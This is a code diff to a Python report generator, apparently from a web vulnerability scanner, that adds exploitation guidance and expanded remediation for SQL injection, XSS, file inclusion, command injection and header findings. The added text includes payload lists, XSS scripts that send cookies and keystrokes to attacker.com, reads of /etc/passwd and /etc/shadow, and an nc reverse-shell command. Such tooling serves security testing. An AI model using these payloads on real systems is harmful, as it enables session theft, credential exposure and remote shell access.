@@ -631,21 +631,135 @@ class ReportCommand:
                         if vuln.get('payload'):
                             f.write(f"Payload Used : {vuln['payload']}\n")
                         
-                        # Add remediation advice based on vulnerability type
+                        # Add detailed exploitation guidance
                         vuln_type = vuln.get('type', '').lower()
-                        f.write("Remediation  : ")
+                        f.write("\nEXPLOITATION GUIDANCE:\n")
+                        f.write("─" * 30 + "\n")
+                        
                         if 'sql injection' in vuln_type:
-                            f.write("Use parameterized queries and input validation\n")
+                            f.write("Manual Testing:\n")
+                            f.write("1. Copy the vulnerable URL and paste it in your browser\n")
+                            f.write("2. Try these payloads in the vulnerable parameter:\n")
+                            f.write("   • ' OR 1=1-- (Check for boolean-based injection)\n")
+                            f.write("   • ' UNION SELECT 1,2,3-- (Test for UNION-based injection)\n")
+                            f.write("   • '; WAITFOR DELAY '00:00:05'-- (SQL Server time delay)\n")
+                            f.write("   • ' AND SLEEP(5)-- (MySQL time delay)\n")
+                            f.write("3. Look for SQL error messages or time delays\n")
+                            f.write("4. Use tools like sqlmap for automated exploitation:\n")
+                            f.write(f"   sqlmap -u \"{vuln.get('url', 'URL')}\"\n\n")
+                            
+                            f.write("Expected Results:\n")
+                            f.write("• Database error messages revealing backend type\n")
+                            f.write("• Different page content with boolean payloads\n")
+                            f.write("• Time delays with time-based payloads\n")
+                            f.write("• Potential data extraction with UNION queries\n\n")
+                            
                         elif 'xss' in vuln_type:
-                            f.write("Implement proper output encoding and CSP headers\n")
+                            f.write("Manual Testing:\n")
+                            f.write("1. Copy the vulnerable URL and paste it in your browser\n")
+                            f.write("2. Try these payloads in the vulnerable parameter:\n")
+                            f.write("   • <script>alert('XSS')</script>\n")
+                            f.write("   • <img src=x onerror=alert('XSS')>\n")
+                            f.write("   • <svg onload=alert('XSS')>\n")
+                            f.write("   • javascript:alert('XSS')\n")
+                            f.write("3. Check if the payload executes (popup appears)\n")
+                            f.write("4. View page source to see if payload is reflected unencoded\n\n")
+                            
+                            f.write("Advanced Exploitation:\n")
+                            f.write("• Cookie stealing: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>\n")
+                            f.write("• Session hijacking: <script>new Image().src='http://attacker.com/log.php?c='+document.cookie</script>\n")
+                            f.write("• Keylogging: <script>document.onkeypress=function(e){new Image().src='http://attacker.com/log.php?k='+String.fromCharCode(e.which)}</script>\n\n")
+                            
                         elif 'lfi' in vuln_type or 'file inclusion' in vuln_type:
-                            f.write("Validate file paths and implement access controls\n")
+                            f.write("Manual Testing:\n")
+                            f.write("1. Copy the vulnerable URL and modify the file parameter:\n")
+                            f.write("2. Try these payloads:\n")
+                            f.write("   • ../../../etc/passwd (Linux systems)\n")
+                            f.write("   • ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts (Windows)\n")
+                            f.write("   • ....//....//....//etc/passwd (Double encoding bypass)\n")
+                            f.write("   • /etc/passwd%00 (Null byte injection - older PHP)\n")
+                            f.write("3. Look for file contents in the response\n\n")
+                            
+                            f.write("Common Target Files:\n")
+                            f.write("• /etc/passwd - User accounts (Linux)\n")
+                            f.write("• /etc/shadow - Password hashes (Linux)\n")
+                            f.write("• /var/log/apache2/access.log - Web server logs\n")
+                            f.write("• C:\\windows\\system32\\drivers\\etc\\hosts - Host file (Windows)\n")
+                            f.write("• /proc/self/environ - Environment variables\n\n")
+                            
                         elif 'command injection' in vuln_type:
-                            f.write("Avoid system calls with user input, use safe APIs\n")
+                            f.write("Manual Testing:\n")
+                            f.write("1. Copy the vulnerable URL and modify the parameter:\n")
+                            f.write("2. Try these command injection payloads:\n")
+                            f.write("   • ; whoami (Command chaining)\n")
+                            f.write("   • | whoami (Pipe operator)\n")
+                            f.write("   • && whoami (AND operator)\n")
+                            f.write("   • `whoami` (Backticks)\n")
+                            f.write("   • $(whoami) (Command substitution)\n")
+                            f.write("3. Look for command output in the response\n\n")
+                            
+                            f.write("Advanced Commands:\n")
+                            f.write("• ; cat /etc/passwd (Read system files)\n")
+                            f.write("• ; ls -la (List directory contents)\n")
+                            f.write("• ; id (Show user privileges)\n")
+                            f.write("• ; nc -l -p 4444 -e /bin/sh (Reverse shell)\n\n")
+                            
+                        elif 'directory traversal' in vuln_type:
+                            f.write("Manual Testing:\n")
+                            f.write("1. Copy the vulnerable URL and modify the path parameter:\n")
+                            f.write("2. Try these directory traversal payloads:\n")
+                            f.write("   • ../../../etc/passwd\n")
+                            f.write("   • ..\\..\\..\\windows\\win.ini\n")
+                            f.write("   • ....//....//....//etc/passwd\n")
+                            f.write("   • %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd (URL encoded)\n")
+                            f.write("3. Check if restricted files are accessible\n\n")
+                            
                         elif 'header' in vuln_type:
-                            f.write("Configure proper security headers in web server\n")
+                            f.write("Manual Verification:\n")
+                            f.write("1. Use browser developer tools (F12) → Network tab\n")
+                            f.write("2. Reload the page and check response headers\n")
+                            f.write("3. Use curl to inspect headers:\n")
+                            f.write(f"   curl -I \"{vuln.get('url', 'URL').split('?')[0]}\"\n")
+                            f.write("4. Look for missing security headers mentioned in description\n\n")
+                            
+                            f.write("Impact Assessment:\n")
+                            f.write("• Missing CSP: Enables XSS attacks\n")
+                            f.write("• Missing X-Frame-Options: Allows clickjacking\n")
+                            f.write("• Missing HSTS: Vulnerable to SSL stripping\n")
+                            f.write("• Missing X-Content-Type-Options: MIME sniffing attacks\n\n")
+                        
+                        # Add remediation advice
+                        f.write("REMEDIATION:\n")
+                        f.write("─" * 30 + "\n")
+                        if 'sql injection' in vuln_type:
+                            f.write("• Use parameterized queries/prepared statements\n")
+                            f.write("• Implement input validation and sanitization\n")
+                            f.write("• Apply principle of least privilege to database accounts\n")
+                            f.write("• Use stored procedures where appropriate\n")
+                        elif 'xss' in vuln_type:
+                            f.write("• Implement proper output encoding (HTML, JS, CSS, URL)\n")
+                            f.write("• Use Content Security Policy (CSP) headers\n")
+                            f.write("• Validate and sanitize all user inputs\n")
+                            f.write("• Use secure frameworks with built-in XSS protection\n")
+                        elif 'lfi' in vuln_type or 'file inclusion' in vuln_type:
+                            f.write("• Validate and whitelist allowed file paths\n")
+                            f.write("• Use absolute paths instead of relative paths\n")
+                            f.write("• Implement proper access controls\n")
+                            f.write("• Avoid direct user input in file operations\n")
+                        elif 'command injection' in vuln_type:
+                            f.write("• Avoid system calls with user input\n")
+                            f.write("• Use safe APIs and libraries instead of shell commands\n")
+                            f.write("• Implement input validation and sanitization\n")
+                            f.write("• Run applications with minimal privileges\n")
+                        elif 'header' in vuln_type:
+                            f.write("• Configure proper security headers in web server\n")
+                            f.write("• Implement Content Security Policy (CSP)\n")
+                            f.write("• Enable HTTP Strict Transport Security (HSTS)\n")
+                            f.write("• Set X-Frame-Options and X-Content-Type-Options\n")
                         else:
-                            f.write("Review security best practices for this vulnerability type\n")
+                            f.write("• Review security best practices for this vulnerability type\n")
+                            f.write("• Implement proper input validation and output encoding\n")
+                            f.write("• Follow secure coding guidelines\n")
                         
                         f.write("\n")
                     
